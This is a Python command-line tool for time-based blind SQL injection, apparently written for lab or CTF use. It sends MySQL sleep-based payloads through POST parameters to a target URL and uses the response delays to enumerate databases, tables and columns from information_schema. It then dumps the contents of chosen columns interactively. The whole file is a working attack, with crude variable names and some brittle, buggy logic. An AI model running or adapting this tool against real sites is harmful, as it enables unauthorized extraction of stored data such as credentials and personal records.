import requests
from pwn import *
import sys
import argparse
from string import *
import time, urllib3, re, figlet

import pyfiglet
  
result = pyfiglet.figlet_format('BLIND SQLI')
print(result)



class bcolors:
    OK = '\033[92m' #GREEN
    WARNING = '\033[93m' #YELLOW
    ladrrr = '8GY.'
    ss = 'OWQ1'
    FAIL = '\033[91m' #RED
    pinocho_chocho = 'y!c'
    RESET = '\033[0m' #RESET COLOR


choises = ["get", "post"]

parser = argparse.ArgumentParser(description="BLIND SQLI HELP MENU")
parser.add_argument('-X', help="HTTP METHOD in LOWERCASE", required=False,default='post',type=str.lower,choices=choises)
parser.add_argument('-u', help="URL target without parameter", required=True)
parser.add_argument('-d', help="DATA POST - Format: \"name':'value',name2:'value'\"", required=False)
parser.add_argument('-time', help="Time Payload sleep ", required=False,default="3",type=str)

args = parser.parse_args()

drg = int(args.time)



urllib3.disable_warnings()

login_url = args.u

if args.d == None:
    print(f"{bcolors.FAIL}POST attack need data value (-d) {bcolors.RESET}","\nFormat: \"'name':'value',name2:'value'\"")
    sys.exit(1)
else:
    if args.d[0] == "'":
        print("Parsing Data...")
        stringer = args.d
        char = "'"
        indices = [i.start() for i in re.finditer(char, stringer)]

        primer = indices[0]
        segundo = indices[1]
        first = args.d[primer:segundo][1:]
        tercero = indices[4]
        cuarto = indices[5]
        second = args.d[tercero:cuarto][1:]
        print(f"{bcolors.OK}PARAMETERS PARSED (Without Values):",first,second,"\n")

    else:
        print(f"{bcolors.FAIL}Invalid DATA Value {bcolors.RESET}")
        sys.exit(1)

global url
global data
global characters
global database


payload = "' or if(substr(database(),%d,1)='%s',sleep("+args.time+"),1)-- -"
payload3 = "' or if(substr((select schema_name FROM information_schema.schemata limit %d,1),%d,1)='%s',sleep("+args.time+"),1)-- -"

characters = string.ascii_lowercase

test = "information_schema, admin, polla, pene, tita,"

p2 = log.progress("Actual Database")
p6 = log.progress("All DataBases: ")
p8 = log.progress("Tables: ")
p9 = log.progress("Columns: ")
p10  = log.progress("Dump Columns: ")



def post():
    def actual_database():
        s = requests.session()
        s.verify = False
        database = ""
        popo = 2
        for position in range(1,15):
            popo = len(database) + 1
            if position != popo:
                next(post2())
            else:
                for character in characters:
                    post_data = {
                        first:payload % (position,character),
                        second :payload
                    }
                    time_start = time.time() 
                    r = s.post(url=login_url, data=post_data)
                    time_end = time.time()

                    if time_end - time_start > drg:
                        database += character
                        p2.status(database)
                        break

    actual_database()


def post2():
    def all_db():
        s = requests.session()
        s.verify = False
        global db
        db = ""
        fifi = 2
        fifa = 0
        characters = string.ascii_lowercase + string.punctuation
        for dbs in range(0,7):
            fifi = len(db)
            if fifi - fifa == 2:
                break
            else:
                pass
            fifa = fifi
            for position in range(1,20):
                popo = len(db) + 1
                for character in characters:
                    post_data = {
                        first:payload3 % (dbs,position,character),
                        second :payload3
                    }
                    time_start = time.time() 
                    r = s.post(url=login_url, data=post_data)
                    time_end = time.time()

                    if time_end - time_start > drg:
                        db += character
                        p6.status(db)
                        break
            db += ", "
            
    all_db()
    stringer = db
    char = ","
    indices2 = [i.start() for i in re.finditer(char, stringer)]
    my_list = []

    if len(indices2) == 1:
        one = indices2[0]

        first_db = db[:one]
        my_list = []
        my_list.append(first_db)

        numbers = [0]
    

    elif len(indices2) == 2:
        one = indices2[0]
        two = indices2[1]

        first_db = db[:one]
        second_db = db[one:two][2:]
        my_list = []
        my_list.append(first_db)
        my_list.append(second_db)

        numbers = [0,1]
    
    elif len(indices2) == 3:
        one = indices2[0]
        two = indices2[1]
        three = indices2[2]

        first_db = db[:one]
        second_db = db[one:two][2:]
        tercera_db = db[two:three][2:]
        my_list = []
        my_list.append(first_db)
        my_list.append(second_db)
        my_list.append(tercera_db)

        numbers = [0,1,2]
    elif len(indices2) == 4:
        one = indices2[0]
        two = indices2[1]
        three = indices2[2]
        four = indices2[3]

        first_db = db[:one]
        second_db = db[one:two][2:]
        tercera_db = db[two:three][2:]
        cuarta_db = db[three:four][2:]
        my_list = []
        my_list.append(first_db)
        my_list.append(second_db)
        my_list.append(tercera_db)
        my_list.append(cuarta_db)

        numbers = [0,1,2,3]
    elif len(indices2) == 5:
        one = indices2[0]
        two = indices2[1]
        three = indices2[2]
        four = indices2[3]
        five = indices2[4]

        first_db = db[:one]
        second_db = db[one:two][2:]
        tercera_db = db[two:three][2:]
        cuarta_db = db[three:four][2:]
        quinta_db = db[four:five][2:]
        my_list = []
        my_list.append(first_db)
        my_list.append(second_db)
        my_list.append(tercera_db)
        my_list.append(cuarta_db)
        my_list.append(quinta_db)

        numbers = [0,1,2,3,4]
    elif len(indices2) == 6:
        one = indices2[0]
        two = indices2[1]
        three = indices2[2]
        four = indices2[3]
        five = indices2[4]
        six = indices2[5]

        first_db = db[:one]
        second_db = db[one:two][2:]
        tercera_db = db[two:three][2:]
        cuarta_db = db[three:four][2:]
        quinta_db = db[four:five][2:]
        sexta_db = db[five:six][2:]
        my_list = []
        my_list.append(first_db)
        my_list.append(second_db)
        my_list.append(tercera_db)
        my_list.append(cuarta_db)
        my_list.append(quinta_db)
        my_list.append(sexta_db)

        numbers = [0,1,2,3,4,5]

    elif len(indices2) == 7:
        one = indices2[0]
        two = indices2[1]
        three = indices2[2]
        four = indices2[3]
        five = indices2[4]
        six = indices2[5]
        seven = indices2[6]

        first_db = db[:one]
        second_db = db[one:two][2:]
        tercera_db = db[two:three][2:]
        cuarta_db = db[three:four][2:]
        quinta_db = db[four:five][2:]
        sexta_db = db[five:six][2:]
        septima_db = db[six:seven][2:]
        my_list = []
        my_list.append(first_db)
        my_list.append(second_db)
        my_list.append(tercera_db)
        my_list.append(cuarta_db)
        my_list.append(quinta_db)
        my_list.append(sexta_db)
        my_list.append(septima_db)

        numbers = [0,1,2,3,4,5,6]

    elif len(indices2) == 8:
        one = indices2[0]
        two = indices2[1]
        three = indices2[2]
        four = indices2[3]
        five = indices2[4]
        six = indices2[5]
        seven = indices2[6]
        eight = indices2[7]

        first_db = db[:one]
        second_db = db[one:two][2:]
        tercera_db = db[two:three][2:]
        cuarta_db = db[three:four][2:]
        quinta_db = db[four:five][2:]
        sexta_db = db[five:six][2:]
        septima_db = db[six:seven][2:]
        octaba_db = db[seven:eight][2:]
        my_list = []
        my_list.append(first_db)
        my_list.append(second_db)
        my_list.append(tercera_db)
        my_list.append(cuarta_db)
        my_list.append(quinta_db)
        my_list.append(sexta_db)
        my_list.append(septima_db)
        my_list.append(octaba_db)

        numbers = [0,1,2,3,4,5,6,7]

    for tr in numbers:
        if len(my_list[tr]) == 0:
            my_list.pop(tr)
    

    global nb_mylist
    nb_mylist = len(my_list)
    def tables_extract(titola):
        s = requests.session()
        global tables
        tables = ""
        s.verify = False
        payload4 = "' or if(substr((select table_name FROM information_schema.tables where table_schema=\""+ titola +"\" limit %d,1),%d,1)='%s',sleep("+args.time+"),1)-- -"
        characters = string.ascii_lowercase + string.punctuation
        for tbl in range(0,6):
            for position in range(1,15):
                for character in characters:
                    post_data = {
                        first:payload4 % (tbl,position,character),
                        second :payload4
                    }
                    time_start = time.time() 
                    r = s.post(url=login_url, data=post_data)
                    time_end = time.time()

                    if time_end - time_start > drg:
                        tables += character
                        p8.status("[+] DataBase: "+titola+": "+tables)
                        break
            tables += ", "
            global hola
            hola = "\n[+] DataBase: "+titola+" Tables= "+'\033[0;32m'+tables+'\033[0m'
        
    

    global sandwix
    if nb_mylist == 1:
        sandwix = my_list
        tables_extract(my_list[0])
        print(hola)
        polla()
    elif nb_mylist == 2:
        sandwix = my_list
        tables_extract(my_list[0])
        print(hola)
        tables_extract(my_list[1])
        print(hola)
        polla()
    elif nb_mylist == 3:
        sandwix = my_list
        tables_extract(my_list[0])
        print(hola)
        print(tables)
        tables_extract(my_list[1])
        print(hola)
        tables_extract(my_list[2])
        print(hola)
        polla()
    elif nb_mylist == 4:
        sandwix = my_list
        tables_extract(my_list[0])
        print(hola)
        tables_extract(my_list[1])
        print(hola)
        tables_extract(my_list[2])
        print(hola)
        tables_extract(my_list[3])
        print(hola)
        polla()
    elif nb_mylist == 5:
        sandwix = my_list
        tables_extract(my_list[0])
        print(hola)
        tables_extract(my_list[1])
        print(hola)
        tables_extract(my_list[2])
        print(hola)
        tables_extract(my_list[3])
        print(hola)
        tables_extract(my_list[4])
        print(hola)
        polla()
    elif nb_mylist == 6:
        sandwix = my_list
        tables_extract(my_list[0])
        print(hola)
        tables_extract(my_list[1])
        print(hola)
        tables_extract(my_list[2])
        print(hola)
        tables_extract(my_list[3])
        print(hola)
        tables_extract(my_list[4])
        print(hola)
        tables_extract(my_list[5])
        print(hola)
        polla()

    
def polla():
    while True: 
        print("\n1- See Columns of Table\n2- Dump Columns of Table\n3- Exit")
        lolipop = int(input("Choose Option: "))
        if lolipop == 1:
            print('\033[0;34m\nPut database/table in same format to see Columns: \033[0m\n')
            jajaja = str(input("SQLI> "))
            posit = jajaja.find("/")
            basedata = jajaja[:posit]
            tabla = jajaja[posit:][1:][:-1]
            payload4 = "' or if(substr((select column_name FROM information_schema.columns where table_schema=\"admin\" and table_name=\""+tabla+"\" limit %d,1),%d,1)='%s',sleep("+args.time+"),1)-- -"
            columnss = ""
            s = requests.session()
            s.verify = False
            characters = string.ascii_lowercase + string.punctuation
            for tbl in range(0,8):
                for position in range(1,15):
                    for character in characters:
                        post_data = {
                            first:payload4 % (tbl,position,character),
                            second :payload4
                        }
                        time_start = time.time() 
                        r = s.post(url=login_url, data=post_data)
                        time_end = time.time()

                        if time_end - time_start > drg:
                            columnss += character
                            p9.status("[+] DataBase: "+basedata+" table "+tabla+": "+'\033[0;32m'+columnss+'\033[0m')
                            break
                columnss += ", "
                hola = "[+] DataBase: "+basedata+" Table: "+tabla+" Columns= "+'\033[0;32m'+columnss+'\033[0m'

        elif lolipop == 2:
            print('\033[0;34m\nPut database/table/column in same format to see Columns (if you want two columns put like this: database/table/column1:column2): \033[0m\n')
            jajaja = str(input("SQLI> "))
            if ":" in jajaja:
                stringer = jajaja
                char = "/"
                indices2 = [i.start() for i in re.finditer(char, stringer)]
                habiba = indices2[0]
                hamza = indices2[1]
                basedata = jajaja[:habiba]
                tabla = jajaja[habiba:hamza][1:]
                columna_carnal = jajaja[hamza:][1:]
                stringer = columna_carnal
                char = ":"
                indices2 = [i.start() for i in re.finditer(char, stringer)]
                ermanem = indices2[0]
                columna1_guarra = columna_carnal[:ermanem]
                columna2_guarra = columna_carnal[ermanem:][1:]
                payload4 = "' or if(substr((select group_concat("+columna1_guarra+",0x3a,"+columna2_guarra+") from "+basedata+"."+tabla+"),%d,1)='%s',sleep(4),1)-- -"                
            else:
                stringer = jajaja
                char = "/"
                indices2 = [i.start() for i in re.finditer(char, stringer)]
                habiba = indices2[0]
                hamza = indices2[1]
                basedata = jajaja[:habiba]
                tabla = jajaja[habiba:hamza][1:]
                columna_carnal = jajaja[hamza:][1:]
                payload4 = "' or if(substr((select group_concat("+columna_carnal+") from "+basedata+"."+tabla+"),%d,1)='%s',sleep("+args.time+"),1)-- -"
            columnss = ""
            s = requests.session()
            s.verify = False 
            characters = string.ascii_lowercase + string.punctuation + string.ascii_uppercase + string.digits
            for position in range(1,100):
                for character in characters:
                    post_data = {
                        first:payload4 % (position,character),
                        second :payload4
                    }
                    time_start = time.time() 
                    r = s.post(url=login_url, data=post_data)
                    time_end = time.time()

                    if time_end - time_start > drg:
                        columnss += character
                        p10.status("[+] DataBase: "+basedata+" table "+tabla+": "+'\033[0;32m'+columnss+'\033[0m')
                        break
            columnss += ", "
            hola = "[+] DataBase: "+basedata+" Table: "+tabla+" Columns= "+'\033[0;32m'+columnss+'\033[0m'
        elif lolipop == 3:
            print('\033[0;31m\nExiting... Bye:) \033[0m')
            sys.exit(1)
        
if args.X == "post":
    #post()
    post2()   
else:
    print("Get it's not avaible")